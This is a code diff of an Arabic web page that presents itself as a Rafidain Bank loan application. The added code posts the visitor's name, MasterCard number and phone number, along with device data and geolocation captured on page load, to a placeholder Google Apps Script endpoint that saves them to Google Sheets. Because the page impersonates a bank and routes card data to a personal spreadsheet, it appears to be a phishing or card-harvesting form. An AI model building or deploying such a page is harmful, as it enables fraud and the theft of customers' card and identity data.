@@ -8,7 +8,6 @@
         :root {
             --primary-color: #0b4f6c;
             --secondary-color: #01baef;
-            --accent-color: #f7b801;
             --bg-color: #f4f7f6;
         }
         body {
@@ -55,7 +54,7 @@
             font-weight: bold;
             color: var(--primary-color);
         }
-        input, select, textarea {
+        input, select {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -99,6 +98,13 @@
             font-size: 18px;
             font-weight: bold;
         }
+        .loading {
+            text-align: center;
+            display: none;
+            color: var(--primary-color);
+            font-weight: bold;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -112,7 +118,7 @@
     <!-- الخطوة الأولى: التحقق من الجهاز والموقع -->
     <div id="step1" class="step active">
         <h3>الخطوة 1: التحقق الأمني والبيئي</h3>
-        <p>يرجى السماح بالوصول إلى الموقع الجغرافي لتأكيد تقديم الطلب من داخل العراق وتحميل بيانات الجهاز.</p>
+        <p>يرجى السماح بالوصول إلى الموقع الجغرافي لتأكيد تقديم الطلب وتحميل بيانات الجهاز.</p>
         
         <div class="device-info-box" id="deviceInfoDisplay">
             جاري فحص الجهاز والموقع...
@@ -136,7 +142,7 @@
             </div>
 
             <div class="form-group">
-                <label for="phone">رقم الهاتف (المسجل بالمفتاح):</label>
+                <label for="phone">رقم الهاتف:</label>
                 <input type="tel" id="phone" required placeholder="07xxxxxxxx">
             </div>
 
@@ -163,7 +169,8 @@
                 </div>
             </div>
 
-            <button type="submit" class="btn">إرسال الطلب نهائياً</button>
+            <button type="submit" id="submitBtn" class="btn">إرسال الطلب نهائياً</button>
+            <div id="loadingText" class="loading">جاري إرسال البيانات وحفظها في Google Sheets...</div>
         </form>
     </div>
 
@@ -171,12 +178,15 @@
     <div id="step3" class="step">
         <div class="success-msg">
             <h3>تم إرسال طلبك بنجاح!</h3>
-            <p>شكراً لتعاملكم مع مصرف الرافدين. تم استلام بياناتكم وصور البطاقة وسيتم مراجعة الطلب وإشعاركم برقم التتبع قريباً عبر الهاتف.</p>
+            <p>شكراً لتعاملكم مع مصرف الرافدين. تم حفظ بياناتكم في النظام وسيتم مراجعة الطلب قريباً.</p>
         </div>
     </div>
 </div>
 
 <script>
+    // ضع رابط الـ Web App الخاص بك هنا بعد نشره في Google Apps Script
+    const SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL";
+
     let clientData = {
         device: navigator.userAgent,
         platform: navigator.platform,
@@ -184,10 +194,8 @@
         lng: null
     };
 
-    // جلب معلومات الجهاز والموقع فور فتح الصفحة
     window.onload = function() {
-        let infoHtml = `<strong>نوع المتصفح والجهاز:</strong> ${clientData.platform} - ${navigator.userAgent.substring(0, 50)}...<br>`;
-        
+        let infoHtml = `<strong>نوع الجهاز:</strong> ${clientData.platform}<br>`;
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -197,7 +205,7 @@
                     document.getElementById('deviceInfoDisplay').innerHTML = infoHtml;
                 },
                 function(error) {
-                    infoHtml += `<strong>حالة الموقع:</strong> لم يتم السماح بالوصول للموقع (تم تخطيها اختيارياً).`;
+                    infoHtml += `<strong>حالة الموقع:</strong> تم تخطي الموقع أو رفض الإذن.`;
                     document.getElementById('deviceInfoDisplay').innerHTML = infoHtml;
                 }
             );
@@ -211,13 +219,53 @@
         document.getElementById('step2').classList.add('active');
     }
 
-    function submitForm(event) {
+    // تحويل الصور إلى Base64 لسهولة إرسالها وحفظها
+    function convertImageToBase64(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = error => reject(error);
+        });
+    }
+
+    async function submitForm(event) {
         event.preventDefault();
         
-        // هنا يتم معالجة البيانات وإرسالها للسيرفر الخاص بك أو قاعدة البيانات
-        // الانتقال لصفحة النجاح
-        document.getElementById('step2').classList.remove('active');
-        document.getElementById('step3').classList.add('active');
+        document.getElementById('submitBtn').style.display = 'none';
+        document.getElementById('loadingText').style.display = 'block';
+
+        const frontFile = document.getElementById('cardFront').files[0];
+        const backFile = document.getElementById('cardBack').files[0];
+
+        let frontBase64 = frontFile ? await convertImageToBase64(frontFile) : "";
+        let backBase64 = backFile ? await convertImageToBase64(backFile) : "";
+
+        const formData = {
+            fullName: document.getElementById('fullName').value,
+            masterCard: document.getElementById('masterCard').value,
+            phone: document.getElementById('phone').value,
+            loanType: document.getElementById('loanType').value,
+            cardFront: frontBase64 ? "تم إرفاق الصورة" : "لا توجد صورة",
+            cardBack: backBase64 ? "تم إرفاق الصورة" : "لا توجد صورة"
+        };
+
+        try {
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            });
+
+            // الانتقال لصفحة النجاح
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+        } catch (error) {
+            alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.');
+            document.getElementById('submitBtn').style.display = 'block';
+            document.getElementById('loadingText').style.display = 'none';
+        }
     }
 </script>
 
